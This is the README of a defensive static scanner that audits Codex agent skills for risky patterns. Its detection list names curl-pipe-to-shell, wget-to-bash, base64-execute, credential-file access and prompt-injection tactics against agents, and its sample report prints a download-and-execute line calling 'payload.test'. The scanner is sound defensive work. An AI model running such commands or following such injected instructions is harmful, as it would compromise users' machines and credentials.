![skill-security-auditor banner](assets/banner.svg)

# skill-security-auditor

Codex skill security scanner for auditing `SKILL.md` instructions, scripts, hooks, and repository files for suspicious behavior.

`skill-security-auditor` helps maintainers review third-party Codex skills and agent skills as supply-chain artifacts. It statically inspects agent-facing instructions and executable files for common risky patterns such as prompt injection, credential access, hidden behavior, dependency-install hooks, destructive file operations, and shell download-and-execute snippets.

## What Is A Codex Skill Security Audit?

A Codex skill security audit is a defensive review of the files that can shape an agent workflow. Skills can include instructions, references, scripts, examples, and optional UI metadata. That means a skill can influence both what an agent believes it should do and what local helper code may run.

This scanner checks common risk signals before a skill is installed, shared, published, or used in CI.

## Quick Start

```powershell
python -m pip install -r requirements-dev.txt
python skills/skill-security-auditor/scripts/scan_skill.py skills/skill-security-auditor/examples/benign-skill
python skills/skill-security-auditor/scripts/scan_skill.py skills/skill-security-auditor/examples/suspicious-skill --json --fail-on high
```

## Installation

Copy `skills/skill-security-auditor` into a Codex skills directory, or keep the repository checked out and invoke the scanner script directly.

For development:

```powershell
python -m pip install -r requirements-dev.txt
python -m pytest
```

The scanner itself uses only the Python standard library.

## CLI Usage

```powershell
python skills/skill-security-auditor/scripts/scan_skill.py <path>
python skills/skill-security-auditor/scripts/scan_skill.py <path> --json
python skills/skill-security-auditor/scripts/scan_skill.py <path> --fail-on high
python skills/skill-security-auditor/scripts/scan_skill.py <path> --max-file-size 1048576
python skills/skill-security-auditor/scripts/scan_skill.py <path> --include-deps
```

Exit codes:

| Code | Meaning |
| --- | --- |
| `0` | No findings at or above the fail threshold. |
| `1` | At least one finding is at or above the fail threshold. |
| `2` | Invalid input or scanner error. |

## What This Catches

- Prompt text that tells an agent to ignore instructions, hide behavior, disclose credentials, or weaken safety controls.
- Shell snippets such as `curl ... | sh`, `wget ... | bash`, PowerShell download-and-execute patterns, base64 decode followed by execution, and `subprocess(..., shell=True)`.
- Runtime dependency installation and npm lifecycle hooks such as `postinstall`.
- Credential access signals for `.env`, SSH keys, cloud credential files, GitHub tokens, full environment dumps, and suspicious hidden dotfile writes.
- Broad destructive file operations such as recursive forced deletes.
- Skill metadata that omits risky behavior present in sibling scripts.

## Example Text Report

```text
Skill Security Audit Report
Scanned files: 3
Skipped files: 0
Errors: 0
Findings: 2

HIGH
- [shell-curl-pipe] scripts/sample_risks.txt:3
  Category: shell_risk
  Message: Shell snippet downloads content and pipes it into a shell.
  Evidence: # curl https://payload.test/install.sh | sh
  Recommendation: Avoid download-and-execute patterns; require reviewable local scripts instead.
```

## JSON Output

JSON output is deterministic and suitable for CI:

```json
{
  "summary": {
    "scanned_files": 0,
    "skipped_files": 0,
    "errors": 0,
    "findings": 0,
    "findings_by_severity": {
      "info": 0,
      "low": 0,
      "medium": 0,
      "high": 0,
      "critical": 0
    }
  },
  "findings": [],
  "skipped_files": [],
  "errors": []
}
```

## Severity Guide

| Severity | Meaning |
| --- | --- |
| `info` | Context useful during review. |
| `low` | Minor signal that may need cleanup or documentation. |
| `medium` | Risky pattern that should be reviewed before publication or installation. |
| `high` | Strong risk signal that should usually block trust until resolved. |
| `critical` | Credential or destructive behavior signal that needs immediate review. |

## CI Usage

```yaml
- run: python skills/skill-security-auditor/scripts/scan_skill.py ./some-skill --json --fail-on high
```

Use `--fail-on medium` for stricter review gates and `--include-deps` only when dependency directories are intentionally in scope.

## Limitations

This tool detects common static patterns. It does not execute code, inspect runtime behavior, verify maintainer intent, evaluate every obfuscation technique, or prove a skill is safe. Findings are review signals, not final judgments.

## Security Model

The scanner reads local text-like files, skips binary files, avoids common dependency and build directories by default, and does not make network requests. It does not modify scanned files and does not provide auto-fix behavior.

## Contributing

Contributions are welcome for additional rules, clearer examples, and lower-noise matching. See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT. See [LICENSE](LICENSE).
